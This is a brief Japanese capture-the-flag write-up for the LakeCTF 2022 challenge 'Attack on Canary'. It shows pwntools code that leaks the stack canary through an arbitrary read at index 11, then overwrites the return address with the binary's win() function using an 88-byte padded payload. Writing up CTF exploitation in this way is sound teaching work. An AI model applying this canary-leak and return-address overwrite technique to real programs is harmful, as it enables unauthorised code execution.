# Attack on Canary - LakeCTF2022

この問題はAARでCanaryをリークして、リターンアドレスを`win()`関数で書き換えることが目的。

## 解法
入力から88文字/ 8byte = 11番目にCanaryの値があるので、次のようにリークする。

```python
def leak_canary() -> bytes:
    io.sendlineafter("command: ", "0")
    io.sendlineafter("read: ", "11")
    return io.recvn(8)

canary = leak_canary()
```

あとは、リターンアドレスを書き換える。
```python
write(b"120", b"A"*88+canary+p64(0)+p64(e.sym["win"]))
```
